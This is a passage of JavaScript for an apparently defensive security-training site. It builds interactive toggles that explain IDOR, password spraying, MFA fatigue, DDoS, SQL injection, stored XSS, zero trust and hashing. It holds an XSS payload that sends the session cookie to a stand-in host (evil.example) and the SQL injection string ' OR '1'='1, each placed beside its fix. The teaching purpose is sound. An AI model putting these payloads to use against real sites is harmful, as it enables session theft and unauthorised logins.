347.6 L510.5 343.9 L514.2 342.9 L508.1 348.1 L507.1 347.6Z M524.1 336.4 L529.2 335.2 L517.4 340.6 L516.2 339.8 L518.7 337.7 L524.1 336.4Z M532.0 334.4 L540.7 334.8 L532.1 336.5 L530.8 335.5 L532.0 334.4Z M548.7 332.2 L552.7 332.6 L546.1 334.9 L546.0 333.7 L548.7 332.2Z"/>
        <text class="vpn-sea-name" x="455" y="168">NORTH SEA</text>
        <g class="vpn-chip quiet" transform="translate(12,360)">
          <rect width="74" height="24" rx="7"/>
          <text x="37" y="16" text-anchor="middle">Ireland</text>
        </g>
        <g class="vpn-chip onland" transform="translate(214,308)">
          <rect width="148" height="26" rx="7"/>
          <text x="74" y="17" text-anchor="middle">United Kingdom</text>
        </g>
        <g class="vpn-off">
          <path class="vpn-clear" d="M 350.9 439.1 L 400.2 440.7 L 430 300 L 560 220 L 688 188"/>
          <g class="vpn-chip sun" transform="translate(500,248)">
            <rect width="108" height="24" rx="7"/>
            <text x="54" y="16" text-anchor="middle">In the clear</text>
          </g>
        </g>
        <g class="vpn-on">
          <path class="vpn-tube" d="M 350.9 439.1 L 400.2 440.7 L 420.5 404.9 L 436.1 375.5 L 476.6 383.5 L 502.2 391.5"/>
          <path class="vpn-tube-in" d="M 350.9 439.1 L 400.2 440.7 L 420.5 404.9 L 436.1 375.5 L 476.6 383.5 L 502.2 391.5"/>
          <path class="vpn-locks" d="M 350.9 439.1 L 400.2 440.7 L 420.5 404.9 L 436.1 375.5 L 476.6 383.5 L 502.2 391.5"/>
          <path class="vpn-hop" d="M 502.2 391.5 L 470 330 L 560 220 L 688 188"/>
          <g class="vpn-chip sun" transform="translate(580,348)">
            <rect width="142" height="24" rx="7"/>
            <text x="71" y="16" text-anchor="middle">Encrypted tunnel</text>
          </g>
        </g>
        <g class="vpn-pinpt" transform="translate(350.9,439.1)">
          <circle r="5" class="vpn-pin"/>
        </g>
        <g class="vpn-chip" transform="translate(278,508)">
          <rect width="72" height="24" rx="7"/>
          <text x="36" y="16" text-anchor="middle">London</text>
        </g>
        <g class="vpn-pinpt vpn-dc" transform="translate(502.2,391.5)">
          <circle r="5" class="vpn-pin"/>
        </g>
        <g class="vpn-chip" transform="translate(600,424)">
          <rect width="112" height="24" rx="7"/>
          <text x="56" y="16" text-anchor="middle">Amsterdam</text>
        </g>
        <g class="vpn-chip quiet" transform="translate(600,456)">
          <rect width="124" height="24" rx="7"/>
          <text x="62" y="16" text-anchor="middle">Netherlands</text>
        </g>
        <g transform="translate(688,188)">
          <rect class="vpn-server" x="-22" y="-14" width="44" height="24" rx="4"/>
          <path class="vpn-win" d="M-14 -6h28M-14 1h28M-14 8h28"/>
        </g>
        <g class="vpn-chip" transform="translate(644,214)">
          <rect width="88" height="24" rx="7"/>
          <text x="44" y="16" text-anchor="middle">Website</text>
        </g>
      </svg>`,
    label: on => ({ btn: on ? "Turn the VPN off" : "Turn the VPN on", state: vpnView(on).label }),
    render: (on, root) => {
      const v = vpnView(on);
      root.querySelector(".xpl-vpn").classList.toggle("is-reduced", reduced());
      root.querySelector("#xpl-cap").innerHTML = `<b>Website sees:</b> ${esc(v.country)} <span class="mono">(${esc(v.ip)})</span>. ${esc(v.seen)} ${esc(VPN.home.note)}`;
    },
  });
  return t;
}

// IDOR (broken access control): logged in as one customer, you ask for another customer's order by changing the
// number in the URL. Without a server-side ownership check the app hands it over; with one it refuses. Matches
// shift-04 (the stolen session walked order IDs) and the idor-log lab.
export const IDOR = {
  yours: "1001", target: "1002",
  off: { status: "200 OK", shows: "Returns order 1002: another customer's name, address and items.",
    note: "The app never checks who the order belongs to, so changing the number leaks it." },
  on: { status: "403 Forbidden", shows: "Access denied: order 1002 isn't yours.",
    note: "The app checks the order belongs to you first, so walking the IDs gets nowhere." },
};
export function idorView(check) { return check ? IDOR.on : IDOR.off; }
function mountIdor(el, { start = false, head = true } = {}) {
  return toggle(el, {
    cls: "xpl-idor", title: "How changing an order number leaks another customer's data", start, head,
    stage: `<div class="mech">
        <div class="mech-bar"><span class="mech-k">Signed in as customer A</span>
          <div class="mech-addr" id="xpl-idor-addr"></div></div>
        <div id="xpl-idor-resp"></div>
      </div>`,
    label: on => ({ btn: on ? "Turn the ownership check off" : "Turn the ownership check on",
      state: on ? "Server checks ownership: on" : "Server checks ownership: off" }),
    render: (on, root) => {
      const v = idorView(on);
      root.querySelector("#xpl-idor-addr").innerHTML = `<span class="was">/orders/${esc(IDOR.yours)}</span><span class="now">/orders/${esc(IDOR.target)}</span>`;
      root.querySelector("#xpl-idor-resp").innerHTML = on
        ? `<div class="order shut"><span class="mech-k">Order ${esc(IDOR.target)}</span><b>Not your order</b><span>The page does not open.</span></div>`
        : `<div class="order open"><span class="mech-k">Order ${esc(IDOR.target)} · customer B</span><b>14 North Road</b><span>Kettle, paid. This is not your order.</span></div>`;
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// Cloud key scope: one leaked application key. If it can read every bucket, the attacker downloads the customer
// exports; if it is least-privilege (only what the app needs) the same key is useless for that. Matches shift-04
// (the app's key downloaded the customer-exports bucket) and the open-bucket lab.
export const CLOUD = {
  bucket: "customer-exports",
  off: { scope: "read + list on every bucket", status: "Allowed", shows: "Lists and downloads the whole customer-exports bucket.",
    note: "A broad key reaches far more than the app needs, so one leak exposes all the data." },
  on: { scope: "write to app-uploads/ only", status: "AccessDenied", shows: "The same key can't touch customer-exports.",
    note: "A least-privilege key only does the app's job, so the same leak gets nothing useful." },
};
export function cloudView(leastPriv) { return leastPriv ? CLOUD.on : CLOUD.off; }
function mountCloud(el, { start = false, head = true } = {}) {
  return toggle(el, {
    cls: "xpl-cloud", title: "Why a leaked key does less harm when it's least privilege", start, head,
    stage: `<div class="xpl-req"><span class="muted">Leaked app key · permissions</span>
        <div class="xpl-url mono" id="xpl-cloud-scope"></div>
        <span class="muted">used against bucket <b class="mono">${esc(CLOUD.bucket)}</b></span></div>
      <div id="xpl-cloud-resp"></div>`,
    label: on => ({ btn: on ? "Make the key broad again" : "Scope the key to least privilege",
      state: on ? "Key permissions: least privilege" : "Key permissions: broad" }),
    render: (on, root) => {
      const v = cloudView(on);
      root.querySelector("#xpl-cloud-scope").textContent = v.scope;
      root.querySelector("#xpl-cloud-resp").innerHTML = respCard(on, v.status, v.shows);
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// Malicious inbox rule: after a mailbox takeover, a quiet rule moves the supplier's real mail to RSS Feeds and
// marks it read, so the owner never sees the bank-change request. Toggle the rule off to reveal the hidden mail.
// Matches shift-02 (the '..' rule on r.hughes's mailbox).
export const INBOX = {
  normal: [{ from: "Rota", subject: "This week's shifts" }, { from: "Vetware", subject: "Software update scheduled" }],
  target: { from: "Grantham Supplies", subject: "Updated bank details for your next invoice" },
  on: { folder: "RSS Feeds", unread: false,
    note: "The hidden rule moves the supplier's real mail out of the Inbox and marks it read, so the owner never sees the bank-change request." },
  off: { folder: "Inbox", unread: true,
    note: "Without the rule it lands in the Inbox, unread, where the owner would question the bank-change request." },
};
export function inboxView(ruleOn) { return ruleOn ? INBOX.on : INBOX.off; }
function mountInbox(el, { start = false, head = true } = {}) {
  const row = (m, extra = "") => `<li class="xpl-mail ${extra}"><b>${esc(m.from)}</b><span>${esc(m.subject)}</span></li>`;
  return toggle(el, {
    cls: "xpl-inbox", title: "How a hidden inbox rule buries the mail that matters", start, head,
    stage: `<div class="xpl-folder"><span class="eyebrow" id="xpl-inbox-folder"></span>
        <ul class="xpl-maillist" id="xpl-inbox-list"></ul></div>`,
    label: on => ({ btn: on ? "Turn the hidden rule off" : "Turn the hidden rule on",
      state: on ? "Hidden rule: on" : "Hidden rule: off" }),
    render: (on, root) => {
      const v = inboxView(on);
      // With the rule on, the supplier mail is gone from the Inbox (moved to RSS Feeds); off, it sits here unread.
      root.querySelector("#xpl-inbox-folder").textContent = `Inbox${on ? "" : " · 1 unread"}`;
      root.querySelector("#xpl-inbox-list").innerHTML =
        INBOX.normal.map(m => row(m)).join("") + (on ? "" : row(INBOX.target, "unread"));
      root.querySelector("#xpl-cap").innerHTML =
        `<b>The supplier's mail is in: ${esc(v.folder)}${v.unread ? "" : " (read)"}.</b> ${esc(v.note)}`;
    },
  });
}

// Three credential attacks that look similar in a log but differ in shape. Spray is the one in shift-01 a5:
// one password against many accounts, one try each, so no single account's lockout trips. Links the signin-spray lab.
export const SPRAY = {
  spray: { label: "Password spray", grid: "1 password x many accounts",
    how: "Tries one common password (like Autumn2026!) once against every account.",
    lockout: "One try per account, so no account's lockout trips: it slips past quietly.",
    catch: "Spotted by many accounts failing from one address in minutes, not by lockouts. The account without MFA is the one that lets them in." },
  brute: { label: "Brute force", grid: "many passwords x 1 account",
    how: "Tries password after password against a single account.",
    lockout: "Trips that account's lockout fast, so it usually fails unless there's no limit.",
    catch: "Spotted by a burst of failures on one account." },
  stuffing: { label: "Credential stuffing", grid: "leaked email+password pairs",
    how: "Replays email and password pairs leaked from some other breach.",
    lockout: "One try per account, so lockouts rarely fire: it works wherever someone reused a password.",
    catch: "Spotted by logins from odd places and by matches to known-breached passwords. MFA stops it even when the password is right." },
};
export function sprayView(k) { return SPRAY[k]; }
function mountSpray(el, { start = "spray" } = {}) {
  return selector(el, {
    cls: "xpl-spray", title: "Password spray, brute force and credential stuffing", start,
    options: [{ key: "spray", label: "Password spray" }, { key: "brute", label: "Brute force" }, { key: "stuffing", label: "Credential stuffing" }],
    foot: "Defender's view only. Fictional accounts and documentation addresses.",
    render: (k, root) => {
      const v = sprayView(k);
      root.querySelector("#xpl-body").innerHTML = `<div class="xpl-shape mono">${esc(v.grid)}</div>
        <dl class="xpl-facts"><div><dt>What it tries</dt><dd>${esc(v.how)}</dd></div>
        <div><dt>Lockout</dt><dd>${esc(v.lockout)}</dd></div></dl>`;
      root.querySelector("#xpl-cap").innerHTML = `<b>How you catch it:</b> ${esc(v.catch)}`;
    },
  });
}

// MFA fatigue (shift-02 a2): an attacker with the password fires repeated push prompts hoping the user taps Approve.
// Number matching is the fix: the user must type a number shown on the login screen, so a prompt they didn't start
// has no number to match and can't be approved blindly.
export const MFA = {
  off: { prompts: "Prompt after prompt: 'Approve sign-in?'", action: "One tired tap of Approve and the attacker is in.",
    note: "A plain yes/no push can be approved by reflex, which is exactly what a flood of prompts is counting on." },
  on: { prompts: "The app shows: 'Enter the number on your screen.'", action: "The attacker's screen has the number; the user's doesn't, so there's nothing to type.",
    note: "Number matching ties the approval to the real sign-in, so a prompt the user didn't start can't be approved by mistake." },
};
export function mfaView(numberMatching) { return numberMatching ? MFA.on : MFA.off; }
function mountMfa(el, { start = false } = {}) {
  return toggle(el, {
    cls: "xpl-mfa", title: "Why number matching stops MFA-fatigue attacks", start,
    stage: `<div class="xpl-req"><span class="muted">Attacker has the password and is firing push prompts</span>
        <div class="xpl-url" id="xpl-mfa-prompt"></div></div><div id="xpl-mfa-resp"></div>`,
    label: on => ({ btn: on ? "Turn number matching off" : "Turn number matching on",
      state: on ? "Number matching: on" : "Number matching: off" }),
    render: (on, root) => {
      const v = mfaView(on);
      root.querySelector("#xpl-mfa-prompt").textContent = v.prompts;
      root.querySelector("#xpl-mfa-resp").innerHTML = respCard(on, on ? "Blocked" : "Account taken over", v.action);
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// DDoS: a server has a fixed capacity. Normal traffic sits under it; a flood of junk requests fills it so real
// visitors are squeezed out. Toggle the attack on and off. Ties to the ddos lesson and the ddos-or-busy lab.
export const DDOS = {
  cap: 100, legit: 35,
  off: { attack: 0, served: true, note: "Normal traffic sits under the server's capacity, so every real visitor is served." },
  on: { attack: 240, served: false, note: "A flood of junk requests fills the capacity, so real visitors are squeezed out and time out. That is a denial of service: the site is down without anything being broken into." },
};
export function ddosView(on) { return on ? DDOS.on : DDOS.off; }
function mountDdos(el, opts = {}) {
  return toggle(el, {
    cls: "xpl-ddos", title: "How a flood of requests knocks a server offline", start: opts.start, head: opts.head,
    stage: `<div class="xpl-capwrap"><div class="xpl-cap" id="xpl-ddos-bar" aria-hidden="true">
        <span class="xpl-seg legit" id="xpl-ddos-legit"></span><span class="xpl-seg attack" id="xpl-ddos-attack"></span>
        <span class="xpl-capline"></span></div>
      <div class="xpl-caplabel mono"><span>Server capacity</span><span id="xpl-ddos-load"></span></div></div>
      <div id="xpl-ddos-resp"></div>`,
    label: on => ({ btn: on ? "Stop the attack" : "Start the attack",
      state: on ? "Traffic: flood" : "Traffic: normal" }),
    render: (on, root) => {
      const v = ddosView(on), total = DDOS.legit + v.attack, pct = x => Math.min(100, (x / DDOS.cap) * 100);
      root.querySelector("#xpl-ddos-legit").style.width = pct(DDOS.legit) + "%";
      root.querySelector("#xpl-ddos-attack").style.width = Math.max(0, Math.min(100 - pct(DDOS.legit), pct(v.attack))) + "%";
      root.querySelector("#xpl-ddos-load").textContent = `${total} / ${DDOS.cap} requests`;
      root.querySelector("#xpl-ddos-bar").classList.toggle("over", total > DDOS.cap);
      root.querySelector("#xpl-ddos-resp").innerHTML = respCard(v.served, v.served ? "Real visitors served" : "Real visitors time out", on ? "Legitimate requests can't get through the flood." : "There is headroom for everyone.");
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// Certificate validation: the browser only shows a padlock when the certificate matches the site, is in date and is
// signed by a trusted CA. Pick a fault to see which check fails and the exact error. Matches the cert-check lab.
export const CERT = {
  valid: { label: "Valid", ok: true, code: "Connection is secure", why: "The name matches, it is in date, and a trusted authority signed it." },
  expired: { label: "Expired", ok: false, code: "NET::ERR_CERT_DATE_INVALID", why: "The certificate's valid-until date has passed, so the browser no longer trusts it." },
  host: { label: "Wrong host", ok: false, code: "NET::ERR_CERT_COMMON_NAME_INVALID", why: "The site's name isn't listed in the certificate (its SAN list), so it may not belong to this site." },
  selfsigned: { label: "Self-signed", ok: false, code: "NET::ERR_CERT_AUTHORITY_INVALID", why: "It was signed by itself, not by an authority the browser trusts, so anyone could have made it." },
};
export function certView(k) { return CERT[k]; }
function mountCert(el, opts = {}) {
  return selector(el, {
    cls: "xpl-cert", title: "What makes a browser trust a site's certificate", start: opts.start, head: opts.head,
    options: [{ key: "valid", label: "Valid" }, { key: "expired", label: "Expired" }, { key: "host", label: "Wrong host" }, { key: "selfsigned", label: "Self-signed" }],
    foot: "Error codes are Chrome's. The cert-check lab reads the same faults in real OpenSSL output.",
    render: (k, root) => {
      const v = certView(k);
      root.querySelector("#xpl-body").innerHTML = respCard(v.ok, v.ok ? "🔒 " + v.code : v.code, v.why);
      root.querySelector("#xpl-cap").innerHTML = v.ok
        ? `<b>Trusted.</b> All three checks pass: name, date and a trusted signer.`
        : `<b>Blocked.</b> The browser warns the user before they go any further.`;
    },
  });
}

// Attack chain (shift-03): one incident that moved from a PC to the file server. A stepped timeline so the
// learner sees how the separate alerts (malware, exfiltration, backup deletion) are one story, caught before
// encryption. Stages map to the malware-tree and ransomware-timeline evidence labs.
export const CHAIN = {
  steps: [
    { n: 1, title: "Infected workstation", at: "HAL-PC-07", lab: "the malware-tree lab",
      text: "j.doyle opens a file that looks like a PDF but ends .pdf.js. It runs hidden PowerShell and drops winupd.exe, an infostealer that beacons out." },
    { n: 2, title: "Credentials stolen", at: "HAL-PC-07", lab: null,
      text: "The infostealer scrapes saved logins from the machine, including the svc-backup service account's password." },
    { n: 3, title: "Into the file server", at: "FS01", lab: "the ransomware-timeline lab",
      text: "The stolen svc-backup login is used to RDP from the workstation into FS01, the client's file server. A service account logging in interactively is the tell." },
    { n: 4, title: "Client data stolen", at: "FS01", lab: "the ransomware-timeline lab",
      text: "rclone copies about 23 GB of client data out to an external cloud address overnight. That is the data breach." },
    { n: 5, title: "Backups sabotaged, caught in time", at: "FS01", lab: "the ransomware-timeline lab", win: true,
      text: "svc-backup deletes Windows shadow copies and the backup catalogue and turns off recovery: the usual last step before ransomware encrypts. The SOC caught it here, before any files were encrypted." },
  ],
};
export function chainStep(i) { return CHAIN.steps[i]; }
function mountChain(el, { start = 0 } = {}) {
  let i = Math.max(0, Math.min(CHAIN.steps.length - 1, start | 0));
  el.innerHTML = `<figure class="xpl xpl-chain">
    <div class="xpl-head"><div class="eyebrow">See it at work</div><b>How this attack moved from a PC to the file server</b></div>
    <ol class="xpl-timeline" id="xpl-chain-steps">${CHAIN.steps.map((s, k) => `<li><button type="button" class="xpl-step${s.win ? " win" : ""}" data-i="${k}" aria-pressed="${k === i}"><span class="xpl-step-n">${s.n}</span><span class="xpl-step-t">${esc(s.title)}</span></button></li>`).join("")}</ol>
    <div class="xpl-stage"><div class="xpl-chain-detail" id="xpl-chain-detail" aria-live="polite"></div>
      <div class="row"><button type="button" class="btn ghost" id="xpl-chain-back">‹ Back</button><button type="button" class="btn" id="xpl-chain-next">Next stage ›</button></div></div>
    <p class="muted xpl-foot">Defender's view only. Fictional client, documentation addresses; the simulated EDR export is labelled as such in the shift.</p>
  </figure>`;
  const paint = () => {
    const s = CHAIN.steps[i];
    el.querySelectorAll(".xpl-step").forEach(b => b.setAttribute("aria-pressed", String(Number(b.dataset.i) === i)));
    el.querySelector("#xpl-chain-detail").innerHTML = `<div class="xpl-chain-card${s.win ? " win" : ""}"><span class="eyebrow">Stage ${s.n} of ${CHAIN.steps.length} · ${esc(s.at)}</span>
      <b>${esc(s.title)}</b><p>${esc(s.text)}</p>${s.lab ? `<p class="muted">Read the evidence in ${esc(s.lab)}.</p>` : ""}</div>`;
    el.querySelector("#xpl-chain-back").disabled = i === 0;
    el.querySelector("#xpl-chain-next").disabled = i === CHAIN.steps.length - 1;
  };
  paint();
  el.querySelectorAll(".xpl-step").forEach(b => b.addEventListener("click", () => { i = Number(b.dataset.i); paint(); }));
  el.querySelector("#xpl-chain-back").addEventListener("click", () => { if (i > 0) { i--; paint(); } });
  el.querySelector("#xpl-chain-next").addEventListener("click", () => { if (i < CHAIN.steps.length - 1) { i++; paint(); } });
  return { get step() { return i; }, set: v => { i = Math.max(0, Math.min(CHAIN.steps.length - 1, v | 0)); paint(); } };
}

// Zero trust vs the old perimeter model (network-modern lesson, BeyondCorp case). The same request from a
// compromised laptop: on a perimeter network, being "inside" is enough; with zero trust every request is checked.
export const ZT = {
  off: { model: "Perimeter (castle and moat)", status: "Trusted by location",
    note: "Once inside the network, through the VPN or a stolen laptop, you're trusted and can reach the file server, the admin panel, everything. One foothold reaches it all." },
  on: { model: "Zero trust (verify every request)", status: "Checked every request",
    note: "Every request is checked against who you are, your device's health and the context, whatever network you're on. A stolen session that fails the checks is denied, even from inside." },
};
export function ztView(on) { return on ? ZT.on : ZT.off; }
function mountZt(el, opts = {}) {
  return toggle(el, {
    cls: "xpl-zt", title: "Perimeter trust vs zero trust", start: opts.start, head: opts.head,
    stage: `<div class="xpl-req"><span class="muted">A request from a compromised laptop to the file server</span>
        <div class="xpl-url mono" id="xpl-zt-model"></div></div><div id="xpl-zt-resp"></div>`,
    label: on => ({ btn: on ? "Switch to the old perimeter model" : "Switch to zero trust",
      state: on ? "Model: zero trust" : "Model: perimeter" }),
    render: (on, root) => {
      const v = ztView(on);
      root.querySelector("#xpl-zt-model").textContent = v.model;
      root.querySelector("#xpl-zt-resp").innerHTML = respCard(on, v.status, on ? "The file server checks the request and denies it if the device or identity fails." : "Inside the network counts as trusted, so the stolen session reaches the file server.");
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)}`;
    },
  });
}

// SQL injection: the login password box contains  ' OR '1'='1  . With a string-built query the input becomes part
// of the SQL and the WHERE always matches; a parameterised query sends it as data, so it is just a password that
// never matches. Matches the web-sqli lesson and the sqli-log lab.
export const SQLI = {
  off: { query: "SELECT * FROM users WHERE name='admin' AND pass='' OR '1'='1'", status: "200 OK",
    body: "Logged in as admin. '1'='1' is always true, so the WHERE matches every row.",
    note: "The typed text is glued straight into the query, so it becomes part of the code." },
  on: { query: "SELECT * FROM users WHERE name='admin' AND pass = ?      (? = the whole typed string)", status: "401 Unauthorized",
    body: "Login fails. The whole input is treated as one password, which simply doesn't match.",
    note: "A parameterised query sends the input as data, never as code, so injection can't change the query." },
};
export function sqliView(paramised) { return paramised ? SQLI.on : SQLI.off; }
function mountSqli(el, opts = {}) {
  return toggle(el, {
    cls: "xpl-sqli", title: "SQL injection: input as code vs input as data", start: opts.start, head: opts.head,
    stage: `<div class="mech">
        <div class="mech-form"><span class="mech-k">Password</span><span class="mech-input">' OR '1'='1</span></div>
        <div class="mech-query" id="xpl-sqli-q"></div>
        <p class="mech-out" id="xpl-sqli-out"></p>
      </div>`,
    label: on => ({ btn: on ? "Turn parameterised queries off" : "Turn parameterised queries on",
      state: on ? "Defence: parameterised query" : "Defence: none (string-built query)" }),
    render: (on, root) => { const v = sqliView(on);
      root.querySelector("#xpl-sqli-q").innerHTML = on
        ? `<span class="sql">SELECT * FROM users WHERE name = </span><span class="sql-data">'admin'</span><span class="sql"> AND pass = </span><span class="sql-slot">?</span><span class="sql-aside">Held as data, not code: <b>' OR '1'='1</b></span>`
        : `<span class="sql">SELECT * FROM users WHERE name = </span><span class="sql-data">'admin'</span><span class="sql"> AND pass = </span><span class="sql-code">'' OR '1'='1'</span>`;
      const out = root.querySelector("#xpl-sqli-out");
      out.className = "mech-out " + (on ? "good" : "bad");
      out.textContent = on ? "Login fails. That text is only a password." : "Logged in as admin. The typed text became part of the query.";
      root.querySelector("#xpl-cap").innerHTML = `${esc(v.note)} If the query does return every row, a database account that can only read what it needs limits the damage.`; },
  });
}

// Stored XSS: a saved review/comment contains a <script> tag. Written into the page as raw HTML, the browser runs
// it (and can steal a viewer's session cookie); escaped on output, the tag is shown as harmless text. Matches the
// web-xss lesson and the xss-review lab.
export const XSS = {
  comment: "<script>fetch('//evil.example/c?='+document.cookie)</script>",
  off: { status: "Runs as code", body: "Every viewer's browser runs the script, so an admin who opens the page has their session cookie sent to the attacker.",
    note: "The comment is written into the page as HTML, so the browser treats the <script> as code." },
  on: { status: "Shown as text", body: "The page prints the characters of the tag as harmless text. Nothing runs.",
    note: "Escaping turns < > & into &lt; &gt; &amp;, so the browser shows the tag instead of running it." },
};
export function xssView(escaped) { return escaped ? XSS.on : XSS.off; }
function mountXss(el, opts = {}) {
  return toggle(el, {
    cls: "xpl-xss", title: "Stored XSS: escaped output vs raw output", start: opts.start, head: opts.head,
    stage: `<div class="mech">
        <div class="mech-page" id="xpl-xss-view"></div>
        <div id="xpl-xss-cookie"></div>
      </div>`,
    label: on => ({ btn: on ? "Turn output escaping off" : "Turn output escaping on",
      state: on ? "Defence: output escaped" : "Defence: none (raw HTML)" }),
    render: (on, root) => { const v = xssView(on);
      root.querySelector("#xpl-xss-view").innerHTML = on
        ? `<span class="mech-k">Review</span><p class="as-text">${esc(XSS.comment)}</p>`
        : `<span class="mech-k">Review</span><p class="ran">The comment is not shown. The browser ran it.</p>`;
      root.querySelector("#xpl-xss-cookie").innerHTML = on
        ? `<div class="cookie-stay">Session cookie stays in the browser</div>`
        : `<div class="cookie-leave"><span>session cookie</span><span>sent to the attacker</span></div>`;
      root.querySelector("#xpl-cap").innerHTML = esc(v.note); },
  });
}

// Hashing: pick an input and see its SHA-256. The same text always gives the same hash; a one-character change
// gives a completely different one (the avalanche effect); and you can't work backwards. Real SHA-256 values.
// Matches the encryption lesson and the hashing lab.
export const HASHES = [
  { key: "a", input: "password", hash: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" },
  { key: "b", input: "Password", hash: "e7cf3ef4f17c3999a94f2c6f612e8a888e5b1026878e4e19398b23bd38ec221a" },
  { key: "c", input: "password1", hash: "0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e" },
];
export function hashView(key) { return HASHES.find(h => h.key === key) || HASHES[0]; }
function mountHash(el, opts = {}) {
  return selector(el, {
    cls: "xpl-hash", title: "Hashing: same in, same out; one change, totally different", head: opts.head, start: opts.start,
    options: HASHES.map(h => ({ key: h.key, label: h.input })),
    foot: "SHA-256, shown in full. A real login also adds a random salt per user before hashing, so equal passwords still differ.",
    render: (key, root) => { const v = hashView(key);
      root.querySelector("#xpl-body").innerHTML = `<div class="xpl-req"><span class="muted">SHA-256 of <b class="mono">${esc(v.input)}</b></span><div class="xpl-url mono">${esc(v.hash)}</div></div>`;
      root.querySelector("#xpl-cap").innerHTML = "The same text always gives the same hash, but changing one character changes all of it, and you can't work backwards from the hash to the text."; },
  });
}
